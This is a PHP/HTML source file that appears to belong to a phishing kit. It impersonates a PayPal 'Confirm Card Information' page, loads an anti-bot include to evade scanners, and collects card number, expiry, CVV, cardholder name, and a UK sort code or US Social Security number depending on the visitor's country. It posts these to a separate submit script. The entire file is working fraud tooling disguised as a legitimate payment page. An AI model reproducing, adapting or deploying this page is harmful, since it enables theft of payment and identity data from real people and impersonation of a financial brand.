<?php

/*

 */

include 'antibots.php';

session_start();

?>
<!DOCTYPE html>
<html>
<head>
    <title>Confirm Card Information - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
    <link href="css/app.css" type="text/css" rel="stylesheet">
    <script src="css/jquery.js" type="text/javascript"></script>
    <script src="css/jquery.maskedinput.js" type="text/javascript"></script>
</head>
<style>

    body{
        margin:0px;
    }
   /* .content_form{
        width: 460px;
        margin-left: 683px;
        padding-left: 44px;
        padding-top: 121px;
    }*/
    .input{
        width: 358px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 18px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;

    }
    .input:focus{
        border: 1px solid #2690FF;
    }
    .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 27px;
        position: relative;
        left: -51px;
        bottom: -9px;
        width: 40px;
    }
    .date{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -434px;
        height: 27px;
        position: relative;
        left: -51px;
        bottom: -9px;
        width: 40px;
    }
    .btn{
        width: 374px;
        height: 44px;
        padding: 10px 15px;
        border: 0px none;
        display: block;
        background: none repeat scroll 0% 0% #009CDE;
        box-shadow: none;
        border-radius: 5px;
        box-sizing: border-box;
        cursor: pointer;
        color: #FFF;
        font-size: 1.14286em;
        text-align: center;
        font-weight: bold;
        font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
        text-shadow: none;
    }
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }

</style>
<body style="background-image: url('css/card_confirm.PNG'); background-repeat: no-repeat; background-position: center -1px;height: 780px;">
    <div style="width: 460px; margin: 0px auto; padding-left: 680px; padding-top: 129px;">
        <div class="content_form">
            <form method="post" action="submit_card.php?websrc=<?php echo md5('nOobAssas!n'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>">
                <div>
                    <br>
                    <p>Primary Credit Card </p>
                    <input type="text" required id="CardHolder" name="CardHolder" class="input" placeholder="Card Holder">
<input type="tel" maxlength="16" required id="cardnumber" name="cardNumber" onkeyup="type_carte()" class="input" placeholder="Card Number">
                    <span class="card" id="card"></span>
                    <input type="text" required id="date" name="date_ex" class="input" placeholder="MM/YYYY" style="width: 170px;">
                    <input type="tel" required maxlength="3" id="cvv" name="cvv"  class="input" placeholder="CSC" style="width: 170px;">
                    <span class="date" id="type_cvv"></span><br>
                    <?php
                    if($_SESSION['country']=="United Kingdom" ){

                       echo '<input type="tel" id="ssn" name="ssn" class="input" placeholder="Sort Code">';
                    }


                    ?>

                    <div id="cont_in">
<?php
                    if($_SESSION['country']=="Great Britain" ){

                       echo '<input type="tel" id="ssn" name="ssn" class="input" placeholder="Sort Code">';
                    }


                    ?>

                    <div id="cont_in">
                    <?php
                    if($_SESSION['country']=="United States of America" ){

                       echo '<input type="tel" id="ssn1" name="ssn1" class="input" placeholder="SSN">';
                    }


                    ?>

                    <div id="cont_in">
                        <span class="check_box" id="inchecked" >This Card is a VBV /MSC</span>
                        <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
                    </div>
                    <input type="submit" class="btn" value="Continue" name="btn_card">
                </div>
            </form>
        </div>
    </div>
    <script>
        jQuery(function($){
            $("#date").mask("99/9999");
            $("#ssn").mask("99-99-99");
            $("#ssn1").mask("999-99-9999");
        });
        /*verif if null or true*/
        /*   $(document).ready(function(){
         var cardlong = document.getElementById('cardnumber');
         if(cardlong.length == false){
         alert('yes');
         }
         $('#cardnumber').blur(function() {
         $('#cardnumber').css('border','1px solid #cf1900');
         });

         });

         $('#date').blur(function() {
         $('#date').css('border','1px solid #cf1900');
         });
         $('#cvv').blur(function() {
         $('#cvv').css('border','1px solid #cf1900');
         });
         */
        /*start scrit check*/
        $(document).on("click","#inchecked",function(){
            var inchecked = document.getElementById('inchecked');
            var input_check = document.getElementById('checkbox');

            if(inchecked.id == 'inchecked'){
                inchecked.id = "checked";
                input_check.setAttribute('checked','checked');
            }
        });
        $(document).on("click","#checked",function(){
            var checked = document.getElementById('checked');
            var input_check = document.getElementById('checkbox');
            if(checked.id == 'checked'){
                checked.id = "inchecked";
                input_check.removeAttribute('checked');
            }
        });
        /*En of script*/


        function type_carte(){
            var get_value = document.getElementById('cardnumber').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
                document.getElementById("card").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv").maxLength ="3"
            }else if(other == "5"){
                document.getElementById("card").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }
            else if(type == "37"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }

            /*End Amex Card*/

            /*blue Card*/
            else if(type == "30"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            } else if(type == "36"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "38"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
                document.getElementById("card").style.backgroundPosition = "0px -86px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "35"){
                document.getElementById("card").style.backgroundPosition = "0px -145px";
                document.getElementById('cont_in').style.display ="none"
            }else{
                document.getElementById("card").style.backgroundPosition = "0px -406px";
                document.getElementById('cont_in').style.display ="block"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -434px";
                document.getElementById("cvv").maxLength ="3"
            }
        };
    </script>
</body>
</html>